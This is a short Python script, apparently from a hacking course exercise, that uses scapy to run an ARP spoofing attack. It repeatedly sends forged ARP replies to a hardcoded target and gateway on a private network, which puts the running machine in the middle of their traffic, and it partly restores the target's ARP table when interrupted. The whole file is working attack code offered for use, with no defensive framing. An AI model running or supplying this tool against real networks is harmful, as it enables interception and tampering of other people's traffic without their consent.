#!/usr/bin/env python
import scapy.all as scapy
import sys
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc

def arpspoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_response, verbose=False)

def reset(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    scapy.send(arp_response, verbose=False)


target_ip = "192.168.43.135"
spoof_ip = "192.168.43.1"
count = 0
try:
    while True:
        arpspoof(target_ip, spoof_ip)
        arpspoof(spoof_ip, target_ip)
        count = count + 2
        print("\r[+]Sent " + str(count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    reset(target_ip, spoof_ip)
    print("\nAttack Terminated by KeyboardInterrupt")

